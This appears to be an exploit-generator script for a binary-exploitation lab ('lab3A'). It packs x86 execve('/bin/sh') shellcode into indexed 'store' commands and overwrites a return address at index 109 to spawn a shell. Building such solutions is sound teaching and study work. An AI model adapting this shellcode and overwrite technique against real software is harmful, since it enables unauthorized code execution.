#!/usr/bin/env python2
#
#   (python2 gen.py 0xbffff4c8 ; cat) | ./lab3A      # (arg = leaked &data)

import struct, sys

insns = [
    "\x31\xc0", "\x50", "\x68\x2f\x2f\x73\x68", "\x68\x2f\x62\x69\x6e",
    "\x89\xe3", "\x50", "\x89\xe2", "\x53", "\x89\xe1", "\xb0\x0b", "\xcd\x80",
]

cells = ["\x90" * 6 + "\xeb\x04"] * 8 \
      + [i + "\x90" * (6 - len(i)) + "\xeb\x04" for i in insns]

idx, i = [], 0
while len(idx) < 2 * len(cells):
    i += 1
    if i % 3:
        idx.append(i)

def store(value, index):
    return ["store", str(value & 0xffffffff), str(index)]

if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("usage: %s <&data[0] as 0x..>" % sys.argv[0])
    data_addr = int(sys.argv[1], 16)

    out, first = [], idx[0]
    for n, c in enumerate(cells):
        a, b = idx[2 * n], idx[2 * n + 1]
        out += store(struct.unpack("<I", c[0:4])[0], a)
        out += store(struct.unpack("<I", c[4:8])[0], b)

    out += store(data_addr + first * 4, 109)
    out += ["quit"]
    sys.stdout.write("\n".join(out) + "\n")
